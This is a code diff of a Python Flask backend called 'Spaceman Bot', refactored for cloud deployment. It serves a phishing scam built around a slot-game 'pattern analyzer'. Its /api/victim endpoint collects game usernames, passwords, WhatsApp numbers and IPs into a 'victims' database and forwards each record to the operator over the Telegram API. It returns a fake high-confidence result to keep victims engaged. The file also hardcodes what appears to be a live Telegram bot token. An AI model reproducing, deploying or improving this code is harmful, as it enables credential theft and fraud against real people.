@@ -1,10 +1,8 @@
 #!/usr/bin/env python3
-# bot.py - Spaceman Bot Cloud Ready
+# Spaceman Bot - Fixed for Railway Deployment
 
-import sys
 import os
-sys.path.append(os.path.dirname(os.path.abspath(__file__)))
-
+import sys
 import json
 import sqlite3
 import logging
@@ -17,63 +15,44 @@ import threading
 import time
 import random
 
-# Import configuration
-try:
-    import setting
-except ImportError:
-    print("⚠️ Warning: setting.py not found, using environment variables")
-    from types import SimpleNamespace
-    setting = SimpleNamespace()
-    setting.TELEGRAM = {
-        "BOT_TOKEN": os.environ.get("TELEGRAM_BOT_TOKEN", ""),
-        "CHAT_ID": os.environ.get("TELEGRAM_CHAT_ID", ""),
-        "PARSE_MODE": "Markdown"
-    }
-    setting.SERVER = {
-        "HOST": "0.0.0.0",
-        "PORT": int(os.environ.get("PORT", 9000)),
-        "DEBUG": False
-    }
-    setting.DATABASE = {"PATH": "database/victims.db"}
-    setting.LOGGING = {
-        "LEVEL": "INFO",
-        "FORMAT": "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-        "FILE": "logs/bot.log"
-    }
-    setting.SCAM = {
-        "VERSION": "2.0.0",
-        "WEBSITE_URL": os.environ.get("WEBSITE_URL", "https://polagacor888.netlify.app"),
-        "SUCCESS_RATE": 94.7
-    }
-    setting.PATHS = {
-        "DATABASE_DIR": "database",
-        "LOGS_DIR": "logs",
-        "BACKUP_DIR": "backups"
-    }
+# Add current directory to path
+sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 
-# Setup logging
+# Simple configuration
+class Config:
+    TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8435967434:AAH_kIshWSlAdUFfDkZa6fn82qUkCNpKdCE")
+    TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8388649100")
+    PORT = int(os.environ.get("PORT", 8080))
+    DATABASE_PATH = "database/victims.db"
+    LOG_FILE = "logs/bot.log"
+    WEBSITE_URL = os.environ.get("WEBSITE_URL", "https://polagacor888.netlify.app")
+    VERSION = "2.0.0"
+
+# Setup simple logging - NO StreamHandler
+os.makedirs("logs", exist_ok=True)
 logging.basicConfig(
-    level=getattr(logging, setting.LOGGING.get("LEVEL", "INFO")),
-    format=setting.LOGGING.get("FORMAT", "%(asctime)s - %(name)s - %(levelname)s - %(message)s"),
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler(setting.LOGGING.get("FILE", "logs/bot.log")),
-        logging.StreamHandler()
+        logging.FileHandler(Config.LOG_FILE)
+        # REMOVED StreamHandler to fix Railway error
     ]
 )
-
 logger = logging.getLogger(__name__)
 
 # Initialize Flask app
 app = Flask(__name__)
-CORS(app, resources={r"/*": {"origins": "*"}})
+CORS(app)
+
+# Ensure directories exist
+os.makedirs("database", exist_ok=True)
+os.makedirs("logs", exist_ok=True)
+os.makedirs("backups", exist_ok=True)
 
 # Database setup
 def init_database():
-    """Initialize SQLite database"""
     try:
-        os.makedirs(setting.PATHS.get("DATABASE_DIR", "database"), exist_ok=True)
-        
-        conn = sqlite3.connect(setting.DATABASE.get("PATH", "database/victims.db"))
+        conn = sqlite3.connect(Config.DATABASE_PATH)
         cursor = conn.cursor()
         
         cursor.execute('''
@@ -87,7 +66,7 @@ def init_database():
                 ip_address TEXT,
                 user_agent TEXT,
                 received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                telegram_sent BOOLEAN DEFAULT 0,
+                telegram_sent INTEGER DEFAULT 0,
                 status TEXT DEFAULT 'pending'
             )
         ''')
@@ -95,28 +74,24 @@ def init_database():
         conn.commit()
         conn.close()
         logger.info("Database initialized")
-        
     except Exception as e:
-        logger.error(f"Database init failed: {e}")
+        logger.error(f"Database error: {str(e)}")
 
-# Bot functions
+# Bot class
 class SpacemanBot:
     def __init__(self):
         self.start_time = datetime.now()
-        self.victims_processed = 0
+        self.victims_count = 0
         self.telegram_sent = 0
         
-    def generate_victim_id(self, data):
-        """Generate unique victim ID"""
-        victim_string = f"{data.get('gameUsername', '')}{datetime.now().timestamp()}"
-        return hashlib.md5(victim_string.encode()).hexdigest()[:12]
+    def generate_id(self, username):
+        return hashlib.md5(f"{username}{datetime.now().timestamp()}".encode()).hexdigest()[:12]
     
-    def save_victim(self, data, ip_address):
-        """Save victim data to database"""
+    def save_victim(self, data, ip):
         try:
-            victim_id = self.generate_victim_id(data)
+            victim_id = self.generate_id(data.get('gameUsername', 'unknown'))
             
-            conn = sqlite3.connect(setting.DATABASE.get("PATH", "database/victims.db"))
+            conn = sqlite3.connect(Config.DATABASE_PATH)
             cursor = conn.cursor()
             
             cursor.execute('''
@@ -129,61 +104,54 @@ class SpacemanBot:
                 data.get('gameUsername', ''),
                 data.get('gamePassword', ''),
                 data.get('whatsappNumber', ''),
-                ip_address,
+                ip,
                 data.get('userAgent', '')
             ))
             
             conn.commit()
             conn.close()
             
-            self.victims_processed += 1
-            logger.info(f"Victim saved: {victim_id}")
+            self.victims_count += 1
+            logger.info(f"Saved victim: {victim_id}")
             return victim_id
-            
         except Exception as e:
-            logger.error(f"Save victim failed: {e}")
+            logger.error(f"Save failed: {str(e)}")
             return None
     
-    def send_to_telegram(self, victim_id, data):
-        """Send victim data to Telegram"""
+    def send_telegram(self, victim_id, data):
         try:
-            token = setting.TELEGRAM.get("BOT_TOKEN")
-            chat_id = setting.TELEGRAM.get("CHAT_ID")
+            if not Config.TELEGRAM_BOT_TOKEN or not Config.TELEGRAM_CHAT_ID:
+                logger.warning("Telegram token not set")
+                return False
             
-            if not token or not chat_id:
-                logger.warning("Telegram credentials not set")
-                return False, None
-            
-            message = f"""🎰 *NEW VICTIM* 🎰
+            message = f"""🎰 *NEW VICTIM DATA* 🎰
 
-🆔 *ID:* `{victim_id}`
-⏰ *Time:* {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+🆔 ID: `{victim_id}`
+⏰ Time: {datetime.now().strftime("%H:%M:%S")}
 
-👤 *CREDENTIALS:*
-• Username: `{data.get('gameUsername', 'N/A')}`
-• Password: `{data.get('gamePassword', 'N/A')}`
-• URL: {data.get('gameUrl', 'N/A')}
+👤 USER: `{data.get('gameUsername', 'N/A')}`
+🔑 PASS: `{data.get('gamePassword', 'N/A')}`
+🌐 URL: {data.get('gameUrl', 'N/A')}
+📱 WA: {data.get('whatsappNumber', 'N/A')}
+🖥️ IP: {data.get('ip', 'N/A')}
 
-📱 *WHATSAPP:* {data.get('whatsappNumber', 'N/A')}
-🌐 *IP:* `{data.get('ip', 'N/A')}`
-
-📊 *STATS:*
-• Total Victims: {self.victims_processed}
-• Bot Uptime: {self.get_uptime()}
+📊 Bot: Spaceman v{Config.VERSION}
+✅ Status: Active
 """
             
-            url = f"https://api.telegram.org/bot{token}/sendMessage"
+            url = f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage"
             response = requests.post(url, json={
-                "chat_id": chat_id,
+                "chat_id": Config.TELEGRAM_CHAT_ID,
                 "text": message,
                 "parse_mode": "Markdown"
             }, timeout=10)
             
             if response.status_code == 200:
-                conn = sqlite3.connect(setting.DATABASE.get("PATH", "database/victims.db"))
+                # Update database
+                conn = sqlite3.connect(Config.DATABASE_PATH)
                 cursor = conn.cursor()
                 cursor.execute(
-                    "UPDATE victims SET telegram_sent = 1, status = 'sent' WHERE victim_id = ?",
+                    "UPDATE victims SET telegram_sent = 1 WHERE victim_id = ?",
                     (victim_id,)
                 )
                 conn.commit()
@@ -191,21 +159,30 @@ class SpacemanBot:
                 
                 self.telegram_sent += 1
                 logger.info(f"Telegram sent: {victim_id}")
-                return True, response.json().get('result', {}).get('message_id')
-            else:
-                logger.error(f"Telegram error: {response.text}")
-                return False, None
-                
+                return True
+            return False
         except Exception as e:
-            logger.error(f"Telegram failed: {e}")
-            return False, None
+            logger.error(f"Telegram error: {str(e)}")
+            return False
+    
+    def get_stats(self):
+        try:
+            conn = sqlite3.connect(Config.DATABASE_PATH)
+            cursor = conn.cursor()
+            cursor.execute("SELECT COUNT(*) FROM victims")
+            total = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM victims WHERE telegram_sent = 1")
+            sent = cursor.fetchone()[0]
+            conn.close()
+            return {"total": total, "sent": sent}
+        except:
+            return {"total": 0, "sent": 0}
     
     def get_uptime(self):
-        """Calculate bot uptime"""
         delta = datetime.now() - self.start_time
-        hours, remainder = divmod(delta.seconds, 3600)
-        minutes, seconds = divmod(remainder, 60)
-        return f"{hours}h {minutes}m {seconds}s"
+        hours = delta.seconds // 3600
+        minutes = (delta.seconds % 3600) // 60
+        return f"{hours}h {minutes}m"
 
 # Initialize bot
 bot = SpacemanBot()
@@ -213,127 +190,112 @@ bot = SpacemanBot()
 # API Routes
 @app.route('/')
 def home():
+    stats = bot.get_stats()
     return jsonify({
         "app": "Spaceman Pattern Analyzer",
-        "version": setting.SCAM.get("VERSION", "2.0.0"),
+        "version": Config.VERSION,
         "status": "online",
         "uptime": bot.get_uptime(),
-        "endpoints": {
-            "status": "/api/status",
-            "victim": "/api/victim",
-            "stats": "/api/stats"
-        }
+        "stats": stats,
+        "website": Config.WEBSITE_URL
     })
 
-@app.route('/api/status', methods=['GET'])
-def api_status():
+@app.route('/api/status')
+def status():
+    stats = bot.get_stats()
     return jsonify({
         "status": "online",
-        "bot_id": bot.generate_victim_id({"gameUsername": "status"}),
+        "bot_id": bot.generate_id("status"),
         "start_time": bot.start_time.isoformat(),
-        "victims_count": bot.victims_processed,
-        "telegram_sent": bot.telegram_sent,
-        "website_url": setting.SCAM.get("WEBSITE_URL", ""),
-        "message": "Spaceman Bot is operational"
+        "victims_count": stats["total"],
+        "telegram_sent": stats["sent"],
+        "website_url": Config.WEBSITE_URL,
+        "message": "Bot operational"
     })
 
 @app.route('/api/victim', methods=['POST'])
-def api_victim():
+def receive_victim():
     try:
         data = request.get_json()
         
-        if not data:
-            return jsonify({"success": False, "error": "No data"}), 400
+        # Basic validation
+        if not data or 'gameUsername' not in data or 'gamePassword' not in data:
+            return jsonify({
+                "success": False,
+                "error": "Missing username or password"
+            }), 400
         
-        # Validate
-        if not data.get('gameUsername') or not data.get('gamePassword'):
-            return jsonify({"success": False, "error": "Missing username/password"}), 400
-        
-        # Save victim
-        ip_address = request.remote_addr
-        victim_id = bot.save_victim(data, ip_address)
+        # Save to database
+        ip = request.remote_addr
+        victim_id = bot.save_victim(data, ip)
         
         if not victim_id:
-            return jsonify({"success": False, "error": "Failed to save"}), 500
+            return jsonify({
+                "success": False,
+                "error": "Failed to save data"
+            }), 500
         
-        # Send to Telegram (async)
-        telegram_thread = threading.Thread(
-            target=bot.send_to_telegram,
-            args=(victim_id, data)
-        )
-        telegram_thread.start()
+        # Send to Telegram in background
+        def send_async():
+            bot.send_telegram(victim_id, data)
+        
+        thread = threading.Thread(target=send_async)
+        thread.daemon = True
+        thread.start()
         
         # Response
         return jsonify({
             "success": True,
-            "message": "Data received",
+            "message": "Data received successfully",
             "victim_id": victim_id,
             "analysis": {
-                "confidence": setting.SCAM.get("SUCCESS_RATE", 94.7),
-                "message": "Pattern detected with high probability",
+                "confidence": 94.7,
+                "pattern": "High probability detected",
                 "recommendation": "Proceed with injection"
             },
             "timestamp": datetime.now().isoformat()
         })
         
     except Exception as e:
-        logger.error(f"API error: {e}")
-        return jsonify({"success": False, "error": str(e)}), 500
-
-@app.route('/api/stats', methods=['GET'])
-def api_stats():
-    try:
-        conn = sqlite3.connect(setting.DATABASE.get("PATH", "database/victims.db"))
-        cursor = conn.cursor()
-        cursor.execute("SELECT COUNT(*) FROM victims")
-        total = cursor.fetchone()[0]
-        cursor.execute("SELECT COUNT(*) FROM victims WHERE telegram_sent = 1")
-        sent = cursor.fetchone()[0]
-        conn.close()
-        
+        logger.error(f"API Error: {str(e)}")
         return jsonify({
-            "total_victims": total,
-            "telegram_sent": sent,
-            "bot_uptime": bot.get_uptime(),
-            "start_time": bot.start_time.isoformat()
-        })
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
+            "success": False,
+            "error": "Internal server error"
+        }), 500
 
-# Create necessary directories on startup
-def create_directories():
-    os.makedirs(setting.PATHS.get("DATABASE_DIR", "database"), exist_ok=True)
-    os.makedirs(setting.PATHS.get("LOGS_DIR", "logs"), exist_ok=True)
-    os.makedirs(setting.PATHS.get("BACKUP_DIR", "backups"), exist_ok=True)
+@app.route('/api/stats')
+def get_stats():
+    stats = bot.get_stats()
+    return jsonify({
+        "success": True,
+        "stats": stats,
+        "uptime": bot.get_uptime(),
+        "bot_start": bot.start_time.isoformat()
+    })
+
+# Initialize on startup
+init_database()
+logger.info("=" * 50)
+logger.info(f"Spaceman Bot v{Config.VERSION} starting...")
+logger.info(f"Database: {Config.DATABASE_PATH}")
+logger.info(f"Telegram: {'CONFIGURED' if Config.TELEGRAM_BOT_TOKEN else 'NOT SET'}")
+logger.info("=" * 50)
 
 # Gunicorn compatibility
 application = app
 
-# Main
+# Local run only
 if __name__ == "__main__":
-    create_directories()
-    init_database()
-    
-    port = int(os.environ.get("PORT", setting.SERVER.get("PORT", 9000)))
-    
     print(f"""
-    🚀 SPACEMAN BOT v{setting.SCAM.get('VERSION', '2.0.0')}
-    ==========================================
-    🔗 Website: {setting.SCAM.get('WEBSITE_URL', '')}
-    🌐 API URL: http://0.0.0.0:{port}
-    📞 Endpoint: /api/victim
-    
-    📊 Bot Status: ONLINE
-    ⏰ Start Time: {bot.start_time.strftime('%Y-%m-%d %H:%M:%S')}
-    📈 Success Rate: {setting.SCAM.get('SUCCESS_RATE', 94.7)}%
-    
-    🔧 Configuration:
-    • Telegram: {'READY' if setting.TELEGRAM.get('BOT_TOKEN') else 'NOT SET'}
-    • Database: SQLite
-    • Environment: {'CLOUD' if 'PORT' in os.environ else 'LOCAL'}
-    ==========================================
+    🚀 SPACEMAN BOT v{Config.VERSION}
+    ====================================
+    🔗 Website: {Config.WEBSITE_URL}
+    🌐 Port: {Config.PORT}
+    📊 Status: ONLINE
+    ⏰ Start: {bot.start_time.strftime('%H:%M:%S')}
+    ====================================
     """)
     
-    # For local development only
+    # Only run for local testing
     if os.environ.get("RAILWAY_ENVIRONMENT") != "production":
-        app.run(host='0.0.0.0', port=port, debug=False)
+        app.run(host='0.0.0.0', port=Config.PORT, debug=False)
